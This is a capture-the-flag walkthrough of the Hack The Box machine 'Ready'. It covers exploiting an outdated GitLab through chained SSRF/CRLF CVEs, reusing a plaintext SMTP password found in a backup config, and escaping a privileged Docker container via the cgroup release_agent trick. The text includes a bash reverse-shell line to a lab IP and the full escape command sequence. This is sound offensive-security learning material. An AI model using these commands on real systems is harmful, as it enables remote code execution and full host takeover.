title: Ready - Walkthrough
---

Overall, a nice box which reminds me of the 'Laboratory' box. I spent more time trying to understand how the exploit to root works than executing it. As usual, I learned something new, which is exactly what I'm looking for on hackthebox. 

## Recon
I start with a quick Nmap followed by a full scan with the default script (-C) and the -V tag to get more info about the services.

{% highlight sh %}
sudo nmap ready && sudo nmap -sCV -p- ready -oN nmap
{% endhighlight %}

As you can see, we only have 2 ports open `22` which `SSH` and the port `5580`, which apparently (`http-title: Sign in \xC2\xB7 GitLab`) could be `Gitlab`.

The first thing I do here is visiting browsing to `http://ready:5080` and I got directly redirected to the <strong><cite>Gitlab</cite></strong> registration page.

I just created an account and logged in !

## Foothold / User

When I see <strong><cite>Gitlab</cite></strong> or any other tool like that, the first thing I want is to get the actual version. So, I browse to the `help` section and got the version `11.4.7`.

The actual version of <strong><cite>Gitlab</cite></strong> is the [13.6](https://gitlab.com/gitlab-org/gitlab/-/releases), so the version on the target is completely outdated ! In fact, the `11.4.7` version has been released in [Nov 2018](https://about.gitlab.com/releases/2018/11/21/gitlab-11-4-7-released/). Hence I want to check for any `CVE` that I can find on 
I <strong><cite>Google</cite></strong>.

I searched for `gitlab 11.4.7 rce` and quickly discovered that [exploit](https://www.exploit-db.com/exploits/49257).

That script exploits these vulnerabilities [CVE-2018-19571](https://nvd.nist.gov/vuln/detail/CVE-2018-19571) and [CVE-2018-19585](https://nvd.nist.gov/vuln/detail/CVE-2018-19585) by chaining them to gain access to the box. 

Basicaly, it uses a `CRLF` vuln to force the server to make request that it's not suppose to make, which is a `SSRF` attack.

If you don't know how these attacks work, I recommend to check out these links to have a better understanding of it. 

https://portswigger.net/web-security/ssrf
https://owasp.org/www-community/vulnerabilities/CRLF_Injection

Back to the exploit, I just modified these lines:

> username='rock'
authenticity_token='JqwnkF6E9zsuEFqtvokB9B3J8VHTzJ6dwN2iCcoT2RnlSUKh7LWEQyVSQ976o4cb3Z82ejYyfXzJOquVm4pH1A=='
cookie = '_gitlab_session=663f6a0f34be6ffa9aa316101b69d437; sidebar_collapsed=false'
localport='4444'
localip='10.10.14.10'
>
>url = "http://10.10.10.220:5080"
proxies = { "http": "http://127.0.0.1:8080" }

Don't forget to add the proxy param if you want to see the request inside `ZAP` or `Burp`. 

> r=session.post(url+'/projects',data=newpayload,headers=headers,allow_redirects=False,proxies=proxies)

I got the authenticity_token and the cookie by creating a new project manualy and then examining the request with `ZAP`.
It looked like that:

Then I ran the script:

{% highlight sh %}
python ./exploit.py
{% endhighlight %}

{% highlight text %}

{% endhighlight %}

And boom ! We have a shell. 

The user flag is there `/home/dude/user.txt`.

## Root

As usual, I made a bit of manual enumeration on the box and found an interersting backup folder here `/opt/backup`.

> 
-rw-r--r-- 1 root root   872 Dec  7 09:25 docker-compose.yml
-rw-r--r-- 1 root root 15092 Dec  1 16:23 gitlab-secrets.json
-rw-r--r-- 1 root root 79639 Dec  1 19:20 gitlab.rb

We have a lot of valuable informations here but the most interesting is inside the `gitlab.rb` file. You can `cat` it but you'll have a lot of useless lines. Hence, if you remove every comments from the output, you'll get a nice password ! 

{% highlight sh %}
cat /opt/backup/gitlab.rb | grep -v '^#' | grep -v '^$'
{% endhighlight %}

{% highlight text %}
gitlab_rails['smtp_password'] = "wW59U!ZKMbG9+*#h"
{% endhighlight %}

Then I switched to root with the new password.

From there, I didn't know where to put my next step, so I uploaded `linpeas` and ran it on the target. 

![e2d3f602a92aa984836b11b2daea5576.png](../_resources/e1c884de695f4e8a8353bdf93ce98fe2.png)

Linpeas confirmed that we are inside a container so I made a quick research on <strong><cite>Google</cite></strong> and I've found a very interesting [article](https://book.hacktricks.xyz/linux-unix/privilege-escalation/escaping-from-a-docker-container) about escaping containers.

> The --privileged flag introduces significant security concerns, and the exploit relies on launching a docker container with it enabled. When using this flag, containers have full access to all devices and lack restrictions from seccomp, AppArmor, and Linux capabilities.
In fact, --privileged provides far more permissions than needed to escape a docker container via this method.

There are a few requirements for the procedure to work: 

> We must be running as root inside the container
The container must be run with the SYS_ADMIN Linux capability
The container must lack an AppArmor profile, or otherwise allow the mount syscall
The cgroup v1 virtual filesystem must be mounted read-write inside the container

The only thing that I'm sure of is that we are `root` inside the docker. Hence I'm gonna give a try and  we'll see what happens.

The [article](https://book.hacktricks.xyz/linux-unix/privilege-escalation/escaping-from-a-docker-container) is well explained and I really encourage you to read it carrefully. 

Here are the steps I did on the box: 

>To trigger this exploit we need a cgroup where we can create a release_agent file and trigger release_agent invocation by killing all processes in the cgroup. The easiest way to accomplish that is to mount a cgroup controller and create a child cgroup.

{% highlight sh %}
mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
{% endhighlight %}

>Next, we enable cgroup notifications on release of the “x” cgroup by writing a 1 to its notify_on_release file. We also set the RDMA cgroup release agent to execute a /cmd script — which we will later create in the container — by writing the /cmd script path on the host to the release_agent file. To do it, we’ll grab the container’s path on the host from the /etc/mtab file.

{% highlight sh %}v
echo 1 > /tmp/cgrp/x/notify_on_release
host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
echo "$host_path/cmd" > /tmp/cgrp/release_agent
{% endhighlight %}

> Now, we create the /cmd script 

{% highlight sh %}
echo '#!/bin/bash' > /cmd
echo "bash -i >& /dev/tcp/10.10.14.2/4545 0>&1" >> /cmd
chmod a+x /cmd
{% endhighlight %}

> Finally, we can execute the attack by spawning a process that immediately ends inside the “x” child cgroup.

{% highlight sh %}
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
{% endhighlight %}

And we got a shell as `root` on the host machine. 

{% highlight text %}
uid=0(root) gid=0(root) groups=0(root)
{% endhighlight %}

Rooted ;)
